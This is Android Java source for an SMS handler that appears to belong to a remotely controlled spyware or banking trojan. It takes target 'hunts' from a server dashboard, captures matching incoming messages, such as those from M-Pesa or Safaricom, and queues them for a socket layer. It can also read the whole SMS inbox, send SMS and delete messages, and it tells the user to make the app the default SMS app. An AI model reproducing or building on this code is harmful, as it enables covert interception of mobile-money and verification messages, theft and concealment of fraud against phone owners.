package com.task.tusker.commands;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * SMS Handler - Read, Send and Delete SMS
 */
public class SMSHandler {

    private Context context;
    private static final String PREFS_NAME = "sms_hunt_store";
    private static final String HUNTS_KEY = "hunts";
    private static final String PENDING_KEY = "pending";
    private static final String SEEN_KEY = "seen";

    public SMSHandler(Context context) {
        this.context = context;
    }

    /**
     * Persist the currently active hunts received from the dashboard. Only
     * enabled hunts are sent by the server, so an empty array intentionally
     * disables capture on this device.
     */
    public JSONObject setSmsHunts(JSONArray hunts) {
        JSONObject result = new JSONObject();
        try {
            JSONArray safe = hunts == null ? new JSONArray() : hunts;
            prefs().edit().putString(HUNTS_KEY, safe.toString()).apply();
            result.put("success", true);
            result.put("hunts", safe.length());
            JSONArray huntIds = new JSONArray();
            for (int i = 0; i < safe.length(); i++) {
                JSONObject hunt = safe.optJSONObject(i);
                if (hunt != null && !hunt.optString("huntId", "").trim().isEmpty()) {
                    huntIds.put(hunt.optString("huntId"));
                }
            }
            result.put("huntIds", huntIds);
            result.put("receivedAt", System.currentTimeMillis());
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        return result;
    }

    /**
     * Match one incoming SMS against the device-local hunt configuration.
     * Matching messages are written to a small private queue before they are
     * handed to the socket layer, so a network gap cannot lose them.
     */
    public JSONObject handleIncomingSms(String sender, String body, long date, String smsId) {
        JSONObject result = new JSONObject();
        try {
            JSONArray hunts = readJsonArray(HUNTS_KEY);
            JSONArray matched = new JSONArray();
            String senderName = resolveContactName(sender);
            // Alphanumeric sender IDs (for example MPESA or SAFARICOM) do
            // not have a phone number and usually have no Contacts entry.
            // Keep the sender itself as the display/matching name.
            if (senderName.trim().isEmpty() && sender != null && !sender.trim().isEmpty()) {
                senderName = sender.trim();
            }
            String messageKey = (smsId == null || smsId.trim().isEmpty())
                    ? sender + "|" + date + "|" + (body == null ? "" : body).hashCode()
                    : smsId.trim();

            if (containsSeenKey(messageKey)) {
                result.put("success", true);
                result.put("matched", false);
                return result;
            }

            for (int i = 0; i < hunts.length(); i++) {
                JSONObject hunt = hunts.optJSONObject(i);
                if (hunt == null || !hunt.optBoolean("enabled", true)) continue;
                String mode = hunt.optString("targetMode", "phone");
                String target = hunt.optString("target", "").trim();
                boolean senderMatches = "name".equals(mode)
                        ? textMatches(senderName, target) || textMatches(sender, target)
                        : phoneMatches(sender, target);
                // Some senders put the originating contact name or phone
                // number in the SMS body instead of exposing it as the
                // address. Treat that as a hunt match as well.
                boolean bodyMatches = "name".equals(mode)
                        ? textMatches(body, target)
                        : phoneAppearsInText(body, target);
                if (senderMatches || bodyMatches) {
                    JSONObject match = new JSONObject();
                    match.put("huntId", hunt.optString("huntId", ""));
                    matched.put(match);
                }
            }

            if (matched.length() > 0) {
                JSONObject message = new JSONObject();
                message.put("smsId", smsId == null ? "" : smsId);
                message.put("messageKey", messageKey);
                message.put("sender", sender == null ? "" : sender);
                message.put("senderName", senderName);
                message.put("body", body == null ? "" : body);
                message.put("date", date > 0 ? date : System.currentTimeMillis());
                JSONArray huntIds = new JSONArray();
                for (int i = 0; i < matched.length(); i++) {
                    huntIds.put(matched.getJSONObject(i).optString("huntId", ""));
                }
                message.put("huntIds", huntIds);
                appendPending(message);
                markSeenKey(messageKey);
                result.put("message", message);
            }
            result.put("success", true);
            result.put("matched", matched.length() > 0);
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        return result;
    }

    public JSONArray getPendingSmsHunts() {
        return readJsonArray(PENDING_KEY);
    }

    public void removePendingSmsHunt(String messageKey) {
        synchronized (SMSHandler.class) {
            JSONArray pending = readJsonArray(PENDING_KEY);
            JSONArray remaining = new JSONArray();
            for (int i = 0; i < pending.length(); i++) {
                JSONObject item = pending.optJSONObject(i);
                if (item != null && !messageKey.equals(item.optString("messageKey", ""))) {
                    remaining.put(item);
                }
            }
            prefs().edit().putString(PENDING_KEY, remaining.toString()).apply();
        }
    }

    private SharedPreferences prefs() {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
    }

    private JSONArray readJsonArray(String key) {
        try {
            return new JSONArray(prefs().getString(key, "[]"));
        } catch (Exception e) {
            return new JSONArray();
        }
    }

    private void appendPending(JSONObject message) {
        synchronized (SMSHandler.class) {
            JSONArray pending = readJsonArray(PENDING_KEY);
            pending.put(message);
            // Keep the offline queue bounded; the oldest records are removed
            // only under extreme pressure rather than allowing unbounded growth.
            while (pending.length() > 500) {
                JSONArray trimmed = new JSONArray();
                for (int i = 1; i < pending.length(); i++) trimmed.put(pending.opt(i));
                pending = trimmed;
            }
            prefs().edit().putString(PENDING_KEY, pending.toString()).apply();
        }
    }

    private boolean containsSeenKey(String messageKey) {
        JSONArray seen = readJsonArray(SEEN_KEY);
        for (int i = 0; i < seen.length(); i++) {
            if (messageKey.equals(seen.optString(i))) return true;
        }
        return false;
    }

    private void markSeenKey(String messageKey) {
        synchronized (SMSHandler.class) {
            JSONArray seen = readJsonArray(SEEN_KEY);
            seen.put(messageKey);
            while (seen.length() > 1000) {
                JSONArray trimmed = new JSONArray();
                for (int i = 1; i < seen.length(); i++) trimmed.put(seen.opt(i));
                seen = trimmed;
            }
            prefs().edit().putString(SEEN_KEY, seen.toString()).apply();
        }
    }

    private boolean phoneMatches(String actual, String target) {
        String a = actual == null ? "" : actual.replaceAll("[^0-9+]", "");
        String b = target == null ? "" : target.replaceAll("[^0-9+]", "");
        if (a.isEmpty() || b.isEmpty()) return false;
        if (a.equals(b)) return true;
        String ad = a.replace("+", "");
        String bd = b.replace("+", "");
        return ad.length() >= 7 && bd.length() >= 7
                && (ad.endsWith(bd) || bd.endsWith(ad));
    }

    private boolean phoneAppearsInText(String body, String target) {
        String targetDigits = target == null ? "" : target.replaceAll("[^0-9]", "");
        String bodyDigits = body == null ? "" : body.replaceAll("[^0-9]", "");
        if (targetDigits.length() < 7 || bodyDigits.isEmpty()) return false;
        if (bodyDigits.contains(targetDigits)) return true;

        // Also accept a local-number form when the hunt target includes a
        // country code, while avoiding short numeric fragments.
        String localDigits = targetDigits.length() > 10
                ? targetDigits.substring(targetDigits.length() - 10) : targetDigits;
        return localDigits.length() >= 7 && bodyDigits.contains(localDigits);
    }

    private boolean textMatches(String actual, String target) {
        String a = actual == null ? "" : actual.trim().toLowerCase();
        String b = target == null ? "" : target.trim().toLowerCase();
        if (a.isEmpty() || b.isEmpty()) return false;
        if (a.contains(b)) return true;
        // Treat punctuation and spaces consistently for names such as
        // "M-Pesa", "M Pesa", and "MPESA".
        String compactA = a.replaceAll("[^\\p{L}\\p{N}]", "");
        String compactB = b.replaceAll("[^\\p{L}\\p{N}]", "");
        return !compactA.isEmpty() && !compactB.isEmpty() && compactA.contains(compactB);
    }

    private String resolveContactName(String sender) {
        if (sender == null || sender.trim().isEmpty()
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                    != PackageManager.PERMISSION_GRANTED) return "";
        Cursor cursor = null;
        try {
            Uri lookup = Uri.withAppendedPath(
                    ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(sender));
            cursor = context.getContentResolver().query(
                    lookup,
                    new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME},
                    null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getString(0);
            }
        } catch (Exception ignored) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return "";
    }

    public JSONObject getAllSMS(int limit) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "body", "date", "type", "read"};

            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, "date DESC LIMIT " + limit);

            JSONArray smsList = new JSONArray();
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                    smsList.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }

            result.put("success", true);
            result.put("messages", smsList);
            result.put("count", smsList.length());

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    public JSONObject getSMSFromNumber(String phoneNumber, int limit) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "body", "date", "type", "read"};
            String selection = "address = ?";
            String[] selectionArgs = new String[]{phoneNumber};

            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, "date DESC LIMIT " + limit);

            JSONArray smsList = new JSONArray();
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                    smsList.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }

            result.put("success", true);
            result.put("phoneNumber", phoneNumber);
            result.put("messages", smsList);
            result.put("count", smsList.length());

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    public JSONObject sendSMS(String phoneNumber, String message) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "SEND_SMS permission not granted");
                return result;
            }

            SmsManager smsManager = SmsManager.getDefault();
            if (message.length() > 160) {
                java.util.ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }

            result.put("success", true);
            result.put("message", "SMS sent successfully");
            result.put("to", phoneNumber);
            result.put("text", message);

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    /**
     * Delete SMS by ID.
     * Requires READ_SMS + WRITE_SMS permissions.
     * On Android 4.4+, requires this app to be the default SMS app.
     * If deletion fails (0 rows), returns an actionable error message.
     */
    public JSONObject deleteSMS(String smsId) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            // Attempt deletion via the SMS content provider
            Uri uri = Uri.parse("content://sms/" + smsId);
            int deleted = 0;
            try {
                deleted = context.getContentResolver().delete(uri, null, null);
            } catch (SecurityException se) {
                result.put("success", false);
                result.put("error", "Permission denied — set this app as the Default SMS app in Android Settings to enable deletion.");
                result.put("smsId", smsId);
                result.put("requiresDefault", true);
                return result;
            }

            if (deleted > 0) {
                result.put("success", true);
                result.put("message", "SMS deleted");
                result.put("smsId", smsId);
            } else {
                // Zero rows deleted — likely not default SMS app on Android 4.4+
                // Try alternative URI format
                Uri altUri = Uri.parse("content://sms");
                int altDeleted = 0;
                try {
                    altDeleted = context.getContentResolver().delete(altUri, "_id=?", new String[]{smsId});
                } catch (SecurityException ignored) {}

                if (altDeleted > 0) {
                    result.put("success", true);
                    result.put("message", "SMS deleted");
                    result.put("smsId", smsId);
                } else {
                    result.put("success", false);
                    result.put("smsId", smsId);
                    result.put("error", "Could not delete — this app must be set as the Default SMS App in Android Settings > Apps > Default apps > SMS app.");
                    result.put("requiresDefault", true);
                }
            }

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }
}
